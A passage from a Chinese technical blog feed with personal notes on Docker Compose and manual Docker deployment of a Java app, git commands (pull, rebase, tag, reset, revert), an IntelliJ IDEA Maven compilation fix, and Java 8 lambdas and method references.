没有现成的镜像文件，需要先使用dockerfile文件打包镜像</span></span><br><span class="line">       context: .		<span class="comment"># 指定dockerfile文件所在路径</span></span><br><span class="line">       dockerfile: Dockerfile</span><br><span class="line">    container_name: hmall</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8080:8080&quot;</span></span><br><span class="line">    networks:</span><br><span class="line">      - hm-net</span><br><span class="line">    depends_on:			<span class="comment"># 依赖于mysql服务，这表示mysql服务会在本hmall服务之前启动</span></span><br><span class="line">      - mysql</span><br><span class="line">  nginx:				<span class="comment"># nginx服务</span></span><br><span class="line">    image: nginx</span><br><span class="line">    container_name: nginx</span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;18080:18080&quot;</span></span><br><span class="line">      - <span class="string">&quot;18081:18081&quot;</span></span><br><span class="line">    volumes:</span><br><span class="line">      - <span class="string">&quot;./nginx/nginx.conf:/etc/nginx/nginx.conf&quot;</span></span><br><span class="line">      - <span class="string">&quot;./nginx/html:/usr/share/nginx/html&quot;</span></span><br><span class="line">    depends_on:</span><br><span class="line">      - hmall</span><br><span class="line">    networks:</span><br><span class="line">      - hm-net</span><br><span class="line">networks:				<span class="comment"># 定义网络</span></span><br><span class="line">  hm-net:				<span class="comment"># 这是在本配置文件中用来引用网络的别名，</span></span><br><span class="line">    name: hmall			<span class="comment"># 这是网络的实际名称，当docker compose创建网络时，会在docker中创建一个名为hmall的网络</span></span><br><span class="line">						<span class="comment"># 在上面服务的networks：的配置中，既可使用别名，也可使用实际名称，效果一样</span></span><br></pre></td></tr></table></figure>

<h3 id="Docker-compose命令"><a href="#Docker-compose命令" class="headerlink" title="Docker compose命令"></a>Docker compose命令</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose [OPTIONS] [COMMAND]</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>类型</strong></th>
<th><strong>参数或指令</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody><tr>
<td>Options</td>
<td>-f</td>
<td>指定compose文件的路径和名称</td>
</tr>
<tr>
<td>Options</td>
<td>-p</td>
<td>指定project名称</td>
</tr>
<tr>
<td>Commands</td>
<td>up</td>
<td>创建并启动所有service容器</td>
</tr>
<tr>
<td>Commands</td>
<td>down</td>
<td>停止并移除所有容器、网络</td>
</tr>
<tr>
<td>Commands</td>
<td>ps</td>
<td>列出所有启动的容器</td>
</tr>
<tr>
<td>Commands</td>
<td>logs</td>
<td>查看指定容器的日志</td>
</tr>
<tr>
<td>Commands</td>
<td>stop</td>
<td>停止容器</td>
</tr>
<tr>
<td>Commands</td>
<td>start</td>
<td>启动容器</td>
</tr>
<tr>
<td>Commands</td>
<td>restart</td>
<td>重启容器</td>
</tr>
<tr>
<td>Commands</td>
<td>top</td>
<td>查看运行的进程</td>
</tr>
<tr>
<td>Commands</td>
<td>exec</td>
<td>在指定的运行中容器中执行命令</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker部署项目-手动部署</title>
    <url>/2024/07/12/docker%E9%A1%B9%E7%9B%AE%E9%83%A8%E7%BD%B2-%E6%89%8B%E5%8A%A8%E9%83%A8%E7%BD%B2/</url>
    <content><![CDATA[<h2 id="后端部署到Docker"><a href="#后端部署到Docker" class="headerlink" title="后端部署到Docker"></a>后端部署到Docker</h2><span id="more"></span>

<ol>
<li><p>java项目打包成一个jar包（注意项目中的关于ip地址的编写）</p>
</li>
<li><p>上传jar包到虚拟机</p>
</li>
<li><p>准备好Dockerfile文件（<strong>写好内容</strong>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 指定基础镜像</span></span><br><span class="line">FROM ubuntu:16.04</span><br><span class="line"><span class="comment"># 配置环境变量，JDK的安装目录、容器内时区</span></span><br><span class="line">ENV JAVA_DIR=/usr/<span class="built_in">local</span></span><br><span class="line"><span class="comment"># 拷贝jdk和java项目的包</span></span><br><span class="line">COPY ./jdk8.tar.gz <span class="variable">$JAVA_DIR</span>/</span><br><span class="line">COPY ./docker-demo.jar /tmp/app.jar</span><br><span class="line"><span class="comment"># 安装JDK</span></span><br><span class="line">RUN <span class="built_in">cd</span> <span class="variable">$JAVA_DIR</span> \ &amp;&amp; tar -xf ./jdk8.tar.gz \ &amp;&amp; mv ./jdk1.8.0_144 ./java8</span><br><span class="line"><span class="comment"># 配置环境变量</span></span><br><span class="line">ENV JAVA_HOME=<span class="variable">$JAVA_DIR</span>/java8</span><br><span class="line">ENV PATH=<span class="variable">$PATH</span>:<span class="variable">$JAVA_HOME</span>/bin</span><br><span class="line"><span class="comment"># 入口，java项目的启动命令</span></span><br><span class="line">ENTRYPOINT [<span class="string">&quot;java&quot;</span>, <span class="string">&quot;-jar&quot;</span>, <span class="string">&quot;/app.jar&quot;</span>]</span><br></pre></td></tr></table></figure></li>
<li><p>选取docker的网络（可以使用自定义的docker网络）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 自定义一个网络</span></span><br><span class="line">docker network create --driver 网络模式 --subnet 子网的网络号/子网掩码 --gateway 网关设置 网络名称			<span class="comment"># 创建一个自定义网络，指定网络模式、网络地址规定、网关地址、网络名称</span></span><br><span class="line">docker network create --driver bridge --subnet 192.168.0.0/16 --gateway 192.168.0.1 mynet</span><br></pre></td></tr></table></figure></li>
<li><p>使用jar和Dockerfile文件，创建docker镜像</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build -t myImage:1.0 .</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li><p><strong>-t</strong> ：是给镜像起名，格式依然是repository:tag的格式，不指定tag时，默认为latest</p>
</li>
<li><p><strong>.</strong> ：是指定Dockerfile所在目录，如果就在当前目录，则指定为”.”</p>
</li>
</ul>
</blockquote>
</li>
<li><p>docker从上面打包的压缩包中加载镜像</p>
<blockquote>
<p>docker load -i 压缩包文件名</p>
</blockquote>
</li>
<li><p>使用该镜像创建&amp;运行容器（<strong>指定使用的docker网络</strong>）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 启动容器（指定网络）</span></span><br><span class="line">docker run -d -P --name 容器名称 --net 网络名称 镜像文件	<span class="comment"># 启动一个容器，指明自定义的网络名称（若不指定，则默认是docker0），就可以通过容器名字实现容器之间的互相访问</span></span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="配置前端的静态资源"><a href="#配置前端的静态资源" class="headerlink" title="配置前端的静态资源"></a>配置前端的静态资源</h2><ol>
<li>前端项目打包成静态资源</li>
<li>上传到服务器</li>
<li>配置nginx.conf</li>
<li>使用nginx的镜像，并用nginx.conf绑定数据卷，创建&amp;运行容器（<strong>指定使用的docker网络</strong>）</li>
</ol>
<blockquote>
<p>指定使用的docker网络，为了使不同容器之间能够通过容器名ping通</p>
</blockquote>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>git pull和git push发生冲突</title>
    <url>/2023/02/16/git%20pull%E5%92%8Cgit%20push%E5%8F%91%E7%94%9F%E5%86%B2%E7%AA%81/</url>
    <content><![CDATA[<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><ul>
<li>git pull发生冲突：首先 git pull = git fetch + git merge，所有只要执行git pull即可（在此之前，需要将有冲突的文件执行git add . 和 git commit -m “备注”，该命令也为了保存自己做了哪些修改）；然后比较不同之处，手动进行最终修改即可。</li>
<li>git push冲突：首先执行git pull，合并后，手动修改，决定最终要留的内容版本，然后重新执行git add . 和git commit -m “备注”</li>
<li>如果时git push，还可以考虑使用git pull –rebase进行变基，来强行将远程仓库的内容换到本地工作区。</li>
</ul>
]]></content>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>git提交项目到github</title>
    <url>/2022/01/04/git%E6%8F%90%E4%BA%A4%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="Git操作步骤"><a href="#Git操作步骤" class="headerlink" title="Git操作步骤"></a>Git操作步骤</h2><span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">初始化-&gt;绑定远程仓库-&gt;拉取最新版本(merge)-&gt;提交到暂存区-&gt;push到远程仓库</span><br></pre></td></tr></table></figure>

<p><strong>初始化：</strong><code>git init</code></p>
<blockquote>
<p>提前创建好和远程分支名同名的分支（需要在第③步之前完成该操作）</p>
</blockquote>
<p><strong>绑定远程仓库：</strong><code>git remote add 名称 地址</code></p>
<p><strong>拉取最新版本(merge)：</strong><code>git pull --rebase 名称 分支</code></p>
<blockquote>
<p>注意：合并是将相同分支名的分支进行合并的</p>
<p><code>git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code></p>
<blockquote>
<p><code>git pull</code> 默认是<code>git fetch</code>和<code>git merge</code>结合</p>
</blockquote>
<blockquote>
<p>可以加上如下参数<code>--rebase</code>：</p>
<p><code>git pull --rebase  &lt;远程主机名，可以是别名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code>的结合方式是<code>git fetch</code>和<code>git rebase</code>结合</p>
<p><strong>解释：所以这条命令是先拉取远程最新代码到本地，再将拉取下来的分支的提交 变基到本地分支上（可以对应到下文的<code>git rebase 目标分支</code>的理解，本条<code>--rebase</code>对应的命令只是将本地分支的提交换成从远程拉取下来的提交，然后都是变基到目标分支上）</strong></p>
</blockquote>
</blockquote>
<p><strong>提交到暂存区：</strong><code>git add .</code>  <code>git commit -m &quot;备注&quot;</code></p>
<p><strong>push到远程仓库：</strong><code>git push -u 名称 分支</code> </p>
<blockquote>
<p>分支需要本地和远程的分支名一样（即远程有与本地同名的分支）</p>
<p>使用了<code>-u</code>选项，Git会将本地分支与指定的远程分支进行关联，在以后的推送或拉取操作中，只需运行<code>git push</code>或<code>git pull</code>，Git就会知道你要推送或拉取哪个分支</p>
</blockquote>
<h2 id="git-log命令"><a href="#git-log命令" class="headerlink" title="git log命令"></a>git log命令</h2><p><code>git log</code>查看commit的历史，最近的更新排在上面</p>
<p><code>git log 分支名</code>查看指定分支名的提交历史记录</p>
<p><code>git log --graph</code>绘制一个ASCII图像来展示提交历史的分支结构（<strong>重点使用</strong>）</p>
<h2 id="git-tag命令"><a href="#git-tag命令" class="headerlink" title="git tag命令"></a>git tag命令</h2><ol>
<li><p>确保通过了<code>git add</code>和<code>git commit</code>提交到了本地仓库</p>
</li>
<li><p>使用<code>git log</code>在提交历史中找到响应的commit。复制该commit的哈希值</p>
</li>
<li><p>使用<code>git tag</code>命令创建新的标签（轻量标签），并将其与指定的commit关联</p>
<blockquote>
<p><strong>轻量标签：</strong></p>
<p><code>git tag &lt;tag_name&gt; &lt;commit_hash&gt;</code>    </p>
<p>将 <code>&lt;tag_name&gt;</code> 替换为您要为 commit 创建的标签名称，<code>&lt;commit_hash&gt;</code> 替换为相应 commit 的哈希值。</p>
<p><strong>附注标签：</strong></p>
<p><code>git tag -a &lt;tag_name&gt; &lt;commit_hash&gt; -m &quot;&lt;tag_message&gt;&quot;</code>    </p>
<p>将 <code>&lt;tag_name&gt;</code> 替换为标签名称，<code>&lt;commit_hash&gt;</code> 替换为相应 commit 的哈希值，<code>&lt;tag_message&gt;</code> 替换为标签的消息或说明。</p>
</blockquote>
</li>
<li><p>可以使用 <code>git tag</code> 命令检查已创建的标签列表<br><code>git tag</code></p>
</li>
<li><p>将本地的标签推送至远程仓库</p>
<blockquote>
<p><code>git push origin &lt;tag_name&gt;</code>    </p>
<p>或者下面命令，推送所有标签至远程仓库</p>
<p><code>git push origin --tags</code></p>
</blockquote>
</li>
</ol>
<h2 id="git-rebase-和git-merge比较"><a href="#git-rebase-和git-merge比较" class="headerlink" title="git rebase 和git merge比较"></a>git rebase 和git merge比较</h2><p><code>git rebase 目标分支</code>：变基，从当前的分之和目标分支的最近公共祖先结点开始，将当前的分支新产生的结点依次与该公共结点合并，并在所有结点都合并完成之后，将当前分支指向最新的合并之后的结点；（最终效果：<strong>合成一条分支</strong>）</p>
<p><code>git merge  目标分支</code>：将当前分支最新结点与目标分支最新结点合并，并将当前结点指针指向合并之后的、新产生的结点</p>
<blockquote>
<p>理解完上面两条命令后，重新看一下最上面的<code>git pull</code>命令的使用格式</p>
</blockquote>
<blockquote>
<p>注：在解决冲突的时候，用 merge 只需要解决一次冲突即可，简单粗暴，而用 rebase 的时候 ，需要一次又一次的解决冲突。</p>
</blockquote>
<h2 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h2><p><code>git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code></p>
<ul>
<li><p><code>git pull</code> 默认是<code>git fetch</code>和<code>git merge</code>结合</p>
</li>
<li><p>可以加上如下参数<code>--rebase</code>：<code>git pull --rebase  &lt;远程主机名，可以是别名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt;</code>的结合方式是<code>git fetch</code>和<code>git rebase</code>结合</p>
</li>
</ul>
<blockquote>
<ul>
<li>尝试将远程仓库的修改合并到本地仓库，但是本地仓库的文件也被修改过了，则<code>git pull</code>会失败（显示为<code>error: local changes to the following files would be overwritten by merge:</code>）</li>
</ul>
<p><strong>解决方法：</strong>将本地的修改的文件<code>git commit</code>到本地仓库，再使用<code>git pull</code>拉取（默认是<code>git fetch</code>和<code>git merge</code>结合） 。接着只需要打开修改的文件，手动将修改的地方进行修改。修改完，最好再将修改后的结果推送至远程仓库</p>
<ul>
<li>在使用<code>git pull</code>成功后可能会发生冲突，发生冲突后，Git能够自动合并您的修改和远程仓库的修改，它会尝试合并并生成一个合并提交。在这种情况下，Git会跳转到让您编写合并提交的备注信息的界面。但是，如果自动合并失败（即有冲突，提示未<code>conflict</code>），则不会自动跳转，而是报错，然后需要自己手动编辑文件，修改冲突，然后<code>git add</code>，再<code>git commit</code>，再<code>git push</code>到远程仓库</li>
</ul>
</blockquote>
<h2 id="git-add-之后git-reset-HEAD"><a href="#git-add-之后git-reset-HEAD" class="headerlink" title="git add 之后git reset HEAD"></a>git add 之后git reset HEAD</h2><p><code>git reset HEAD &lt;file&gt;</code>：取消 Git 中已经添加<code>add</code>但尚未提交<code>commit</code>的内容</p>
<ul>
<li><code>&lt;file&gt;</code> 是要取消添加的文件名或路径</li>
</ul>
<p><code>git reset HEAD .</code>：取消添加所有文件</p>
<h2 id="git-revert和git-reset回退"><a href="#git-revert和git-reset回退" class="headerlink" title="git revert和git reset回退"></a>git revert和git reset回退</h2><p><code>git revert &lt;commit&gt;</code></p>
<ul>
<li><code>&lt;commit&gt;</code> 是您希望回退到的目标版本的提交哈希值或引用</li>
<li>创建一个新的提交，用于撤销指定版本之后的所有更改。这意味着撤销操作本身会成为 Git 历史的一部分，可以追溯到撤销具体哪些更改。</li>
</ul>
<p><code>git reset &lt;commit&gt;</code></p>
<ul>
<li><code>&lt;commit&gt;</code> 是您希望回退到的目标版本的提交哈希值或引用</li>
<li>命令会修改 Git 历史，将当前分支的 HEAD 指针移动到目标版本。这意味着目标版本之后的所有提交将被丢弃，它们将不再存在于 Git 历史中。</li>
<li>潜在影响他人协作</li>
</ul>
<p><em>更多命令见我OneNote笔记</em></p>
]]></content>
      <tags>
        <tag>git操作</tag>
      </tags>
  </entry>
  <entry>
    <title>idea中使用maven不依赖其模板创建javaweb项目，java源文件夹不编译</title>
    <url>/2021/10/18/idea%E4%B8%AD%E4%BD%BF%E7%94%A8maven%E4%B8%8D%E4%BE%9D%E8%B5%96%E5%85%B6%E6%A8%A1%E6%9D%BF%E5%88%9B%E5%BB%BAjavaweb%E9%A1%B9%E7%9B%AE%EF%BC%8Cjava%E6%BA%90%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8D%E7%BC%96%E8%AF%91/</url>
    <content><![CDATA[<h2 id="遇到问题"><a href="#遇到问题" class="headerlink" title="遇到问题"></a>遇到问题</h2><span id="more"></span>

<p>今天在学习struts2过程中，遇到这样的问题：<strong>创建web项目时没有使用maven自带的模板，而是通过Add Framework Support…的方式，但是启动Tomcat后，发现Java文件夹下所有的文件都没编译，而且，项目只生成了out文件夹，没有target文件夹（主要是没有target文件夹）</strong></p>
<p><strong>上面的错误有时候会发生，也有时候不发生</strong></p>
<img src="https://i.loli.net/2021/10/18/vmDFLwjtbUJHpyW.png" alt="image-20211018201238526" style="zoom:50%;" />

<h2 id="遇错过程"><a href="#遇错过程" class="headerlink" title="遇错过程"></a>遇错过程</h2><img src="https://i.loli.net/2021/10/18/g3CXleVa91N4I5z.png" alt="image-20211018200432606" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/CQMcp1HFJa2bUkI.png" alt="image-20211018200323793" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/cO54aqt2VjGISvz.png" alt="image-20211018200458462" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/2fFOC5gw6Jt7Zsn.png" alt="image-20211018200614282" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/pIaiEUvhWXNek45.png" alt="image-20211018200712811" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/Tpk6iMzXyal2QrR.png" alt="image-20211018200816394" style="zoom:50%;" />

<img src="https://i.loli.net/2021/10/18/vmDFLwjtbUJHpyW.png" alt="image-20211018201238526" style="zoom:50%;" />

<h2 id="导致后果"><a href="#导致后果" class="headerlink" title="导致后果"></a>导致后果</h2><p>①在Tomcat运行Web项目的时候，会出现找不到类的错误，</p>
<p>②在Struts2的项目中，会出现Filter过滤器失败的错误</p>
<p><strong>总之，上面两个后果，都是由于java文件没有被编译</strong></p>
<h2 id="分析原因："><a href="#分析原因：" class="headerlink" title="分析原因："></a>分析原因：</h2><p><strong>错误原因：应该是由于后来add framework support的时候，有些东西，idea没有读取加载到，所以没有编译Java源文件</strong></p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>解决方法有好多种，网上有好多感觉是通过修改artifact、module的路径来解决的，反正我也没有看明白，也就没有去尝试</p>
<p>我采取的方式为<strong>重新加载module，并重新指定module的功能特征（Facets）</strong></p>
<p>然后整理了一下思路，解决思路写的更明晰一点</p>
<p><img src="https://i.loli.net/2021/10/18/tYhzQ2VSv74icxK.png" alt="image-20211018202305727"></p>
<p><img src="https://i.loli.net/2021/10/18/GfSAUw9XCnbizsK.png" alt="image-20211018202351584"></p>
<p><img src="https://i.loli.net/2021/10/18/i2YCbuFWkoTgQm3.png" alt="image-20211018202503499"></p>
<p><img src="https://i.loli.net/2021/10/18/tdZSm8eVbHU4Qc5.png" alt="image-20211018202538600"></p>
<p><img src="https://i.loli.net/2021/10/18/DK8bmOSfRwd51W6.png" alt="image-20211018202551678"></p>
<p><img src="https://i.loli.net/2021/10/18/bzSvPnawDQeEA6k.png" alt="image-20211018202609122"></p>
<p><img src="https://i.loli.net/2021/10/18/A8oVEmMcdnBIuh5.png" alt="image-20211018202654718"></p>
<p><img src="https://i.loli.net/2021/10/18/Q68IS4p1bm2HTBP.png" alt="image-20211018202841025"></p>
]]></content>
      <tags>
        <tag>javaweb项目</tag>
        <tag>java源文件不编译</tag>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>java8新特性：方法引用(双冒号)、lambda表达式</title>
    <url>/2021/11/29/java8%E6%96%B0%E7%89%B9%E6%80%A7%EF%BC%9A%E5%8F%8C%E5%86%92%E5%8F%B7%E3%80%81lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="lambda表达式"><a href="#lambda表达式" class="headerlink" title="lambda表达式"></a>lambda表达式</h2><span id="more"></span>

<h3 id="重要特征"><a href="#重要特征" class="headerlink" title="重要特征"></a>重要特征</h3><p>以下是lambda表达式的重要特征:</p>
<ul>
<li><strong>可选类型声明：</strong>不需要声明参数类型，编译器可以统一识别参数值。</li>
<li><strong>可选的参数圆括号：</strong>一个参数无需定义圆括号，但多个参数需要定义圆括号。</li>
<li><strong>可选的大括号：</strong>如果主体包含了一个语句，就不需要使用大括号。</li>
<li><strong>可选的返回关键字：</strong>如果主体只有一个表达式返回值则编译器会自动返回值，大括号需要指定表达式返回了一个数值。</li>
</ul>
<p>将以上四大特征理解就差不多了</p>
<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p><strong>总的来说，就一个功能：实现有唯一的抽象函数的接口</strong></p>
<ol>
<li><p>在使用接口的时候，一般我们需要再写一个实现类，来实现这个接口，然后才可以调用这个方法。但是有了lambda表达式之后，我们可以不写这个实现类，直接在需要调用的地方，使用lambda表达式来实现这个方法，然后直接调用就行（<strong>前提：该接口只有一个需要实现的方法</strong>）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//接口</span></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">t</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//使用lambda表达式进行实现接口中方法</span></span><br><span class="line">    A a1 = () -&gt; System.out.println(<span class="string">&quot;jjj&quot;</span>);</span><br><span class="line">    <span class="comment">//直接调用就行</span></span><br><span class="line">    a1.t();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>在集合的forEach方法中，直接使用lambda函数</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">aaa</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List l = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    l.forEach((a) -&gt; System.out.println(a));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>这里之所以能够使用Lambda表达式，原理其实和第1点中一样</p>
<p>因为<strong>forEach方法</strong>其实是<strong>List的父类Collection的父类Iterable的一个方法</strong>，</p>
<p>而Iterable接口的这个forEach()的参数是<strong>Consumer类型</strong>，</p>
<p>而Consumer类型又<strong>只有一个抽象方法accept()</strong></p>
<p>所以此处<strong>本质上</strong>是使用lambda表达式实现这个Consumer类的<strong>唯一</strong>的抽象方法<strong>accept()</strong></p>
<p>（具体可参见JDK源码）</p>
</blockquote>
</li>
</ol>
<h2 id="方法引用（-双冒号）"><a href="#方法引用（-双冒号）" class="headerlink" title="方法引用（::双冒号）"></a>方法引用（::双冒号）</h2><p>看了很多博客，如果想要更正确的理解，还可以参考这篇博客：<a href="https://blog.csdn.net/lkforce/article/details/99682885">(22条消息) java中的方法引用_lkforce-CSDN博客_java方法引用</a></p>
<p>（感觉这篇讲的比较清晰了<img src="https://i.loli.net/2021/11/29/3fZ7AmGHjzlTgvr.png" alt="img">)</p>
<p>本博客可能会与上面那篇博客有些地方的分类不一样，但是本文看完之后，如果懂了原理，就都会懂得</p>
<p><strong>首先一句话：</strong></p>
<blockquote>
<p><strong>”::“双冒号运算符就是Java中的方法引用</strong></p>
</blockquote>
<h3 id="方法引用的种类"><a href="#方法引用的种类" class="headerlink" title="方法引用的种类"></a>方法引用的种类</h3><p>方法引用有四种，分别是：</p>
<ul>
<li>指向静态方法的引用</li>
<li>指向某个对象的实例方法的引用</li>
<li>指向某个类型的实例方法的引用</li>
<li>指向构造方法的引用</li>
</ul>
<table>
<thead>
<tr>
<th>种类</th>
<th>案例</th>
<th>Lambda表达式写法</th>
</tr>
</thead>
<tbody><tr>
<td>引用静态方法</td>
<td><code>ContainingClass::staticMethodName</code></td>
<td>x -&gt; String.valueOf(x)</td>
</tr>
<tr>
<td>对特定对象的实例方法的引用</td>
<td><code>containingObject::instanceMethodName</code></td>
<td>x -&gt; x.toString()</td>
</tr>
<tr>
<td>对特定类型的任意对象的实例方法的引用</td>
<td><code>ContainingType::methodName</code></td>
<td>() -&gt; x.toString()</td>
</tr>
<tr>
<td>对构造函数的引用</td>
<td><code>ClassName::new</code></td>
<td>() -&gt; new ArrayList&lt;&gt;()</td>
</tr>
</tbody></table>
<p><strong>注意：</strong>可以看到，::运算符调用方法的时候，都是<strong>没有写出参数列表</strong>的，但是JVM会自动地将参数进行传递</p>
<p><strong>！！！此表只是用来作参考，不重要！！！</strong></p>
<p><strong>！！！此表只是用来作参考，不重要！！！</strong></p>
<p><strong>！！！此表只是用来作参考，不重要！！！</strong></p>
<h4 id="使用前提"><a href="#使用前提" class="headerlink" title="使用前提"></a><strong>使用前提</strong></h4><p>调用的<strong>方法，必须是原本就已经存在</strong>的方法（而不是像lambda表达式那样自己再写个函数式接口来实现一个抽象方法的）</p>
<h4 id="本质"><a href="#本质" class="headerlink" title="本质"></a><strong>本质</strong></h4><p>在网上看到一个人见解是这样的，感觉说的很有道理“<strong>把方法引用还原成一个接口实现对象</strong>”</p>
<p><img src="https://i.loli.net/2021/11/29/vOUmJlEFxjzAgqB.png" alt="image-20211129213132551"></p>
<h4 id="传参过程"><a href="#传参过程" class="headerlink" title="传参过程"></a><strong>传参过程</strong></h4><p>（想了很久）我觉的应该是，在调用的时候，只需要<code>外面的语句，有赋值的含义就行了</code>（当然，这说法很不科学，仅为我个人的为了搞清楚具体的使用方法而编出来的），然后JVM就会<strong>根据</strong> <strong>方法的形参列表</strong>和<strong>外面的语句</strong>，自动进行传入参数。</p>
<h3 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h3><h4 id="静态方法语法"><a href="#静态方法语法" class="headerlink" title="静态方法语法"></a><strong>静态方法语法</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; list = Arrays.asList(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="string">&quot;cccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//静态方法语法	ClassName::methodName</span></span><br><span class="line">    list.forEach(Demo::print);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String content)</span></span>&#123;</span><br><span class="line">    System.out.println(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="类实例方法语法"><a href="#类实例方法语法" class="headerlink" title="类实例方法语法"></a><strong>类实例方法语法</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    List&lt;String&gt; list = Arrays.asList(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="string">&quot;cccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//对象实例语法	instanceRef::methodName</span></span><br><span class="line">    list.forEach(<span class="keyword">new</span> Demo()::print);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String content)</span></span>&#123;</span><br><span class="line">    System.out.println(content);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="超类方法语法"><a href="#超类方法语法" class="headerlink" title="超类方法语法"></a><strong>超类方法语法</strong></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Example</span> <span class="keyword">extends</span> <span class="title">BaseExample</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        List&lt;String&gt; list = Arrays.asList(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="string">&quot;cccc&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对象的超类方法语法： super::methodName </span></span><br><span class="line">        list.forEach(<span class="keyword">super</span>::print);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BaseExample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">print</span><span class="params">(String content)</span></span>&#123;</span><br><span class="line">        System.out.println(content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="类构造器语法"><a href="#类构造器语法" class="headerlink" title="类构造器语法"></a><strong>类构造器语法</strong></h4><p>构造方法也是方法，构造方法引用实际上表示一个函数式接口中的唯一方法引用了一个类的构造放法，引用的是那个参数相同的构造方法</p>
<p>（在下面的案例中是：<code>TargetClass::new</code>引用了与接口<code>ImTheOne</code>中唯一的抽象方法的<code>ImTheOne</code>的参数列表一样的构造函数<code>public TargetClass(String a)&#123; oneString = a; &#125;</code>，来实现这个唯一的抽象方法；所以，然后我们就调用这个被实现过的抽象的方法，来构造实例了）</p>
